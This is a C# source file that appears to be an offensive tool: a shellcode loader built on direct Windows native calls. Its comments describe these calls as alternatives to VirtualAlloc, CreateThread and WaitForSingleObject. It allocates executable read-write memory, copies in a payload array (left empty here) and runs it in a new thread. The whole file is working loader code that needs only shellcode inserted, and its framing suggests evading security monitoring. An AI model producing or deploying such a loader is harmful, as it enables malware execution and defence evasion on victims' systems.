using System;
using System.Runtime.InteropServices;
using static ring.Native;
using static ring.ringC;

namespace Syscall
{
    class Program
    {
        static void Main()
        {

            byte[] payload = new byte[] { };

            IntPtr hCurrentProcess = GetCurrentProcess();
            IntPtr pMemoryAllocation = new IntPtr(); // needs to be passed as ref
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length)); // needs to be passed as ref
            uint allocationType = (uint)Native.AllocationType.Commit | (uint)Native.AllocationType.Reserve; // reserve and commit memory
            uint protection = (uint) Native.AllocationProtect.PAGE_EXECUTE_READWRITE; // set the memory protection to RWX, not suspicious at all...

            /*   Allocate memory for shellcode via syscall (alternative to VirtualAlloc Win32 API)   */
            try
            {
                var ntAllocResult = NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
                Console.WriteLine($"[*] Result of NtAllocateVirtualMemory is {ntAllocResult}");
                Console.WriteLine("[*] Address of memory allocation is " + string.Format("{0:X}", pMemoryAllocation));
            }
            catch
            {
                Console.WriteLine("[*] NtAllocateVirtualMemory failed.");
                Environment.Exit(1);
            }

            /*   Copy shellcode to memory allocated by NtAllocateVirtualMemory   */
            try
            {
                Marshal.Copy(payload, 0, (IntPtr)(pMemoryAllocation), payload.Length);
            }
            catch 
            { 
                Console.WriteLine("[*] Marshal.Copy failed!"); 
                Environment.Exit(1); 
            }

            IntPtr hThread = new IntPtr(0);
            ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            uint stackZeroBits = 0;
            uint sizeOfStackCommit = 0xFFFF;
            uint sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);

            /*   Create a new thread to run the shellcode (alternative to CreateThread Win32 API)   */
            try
            {
                var hThreadResult = NtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
                Console.WriteLine($"[*] Result of NtCreateThreadEx is {hThreadResult}");
                Console.WriteLine($"[*] Thread handle returned is {hThread}");
            }
            catch
            {
                Console.WriteLine("[*] NtCreateThread failed.");
            }

            /*   Wait for the thread to start (alternative to WaitForSingleObject Win32 API)   */

            try
            {
                var result = NtWaitForSingleObject(hThread, true, 0); // alertable or not alertable, no change...
                Console.WriteLine($"[*] Result of NtWaitForSingleObject is {result}");
            }
            catch
            {
                Console.WriteLine("[*] NtWaitForSingleObject failed.");
                Environment.Exit(1);
            }

            return;
        }
    }
}
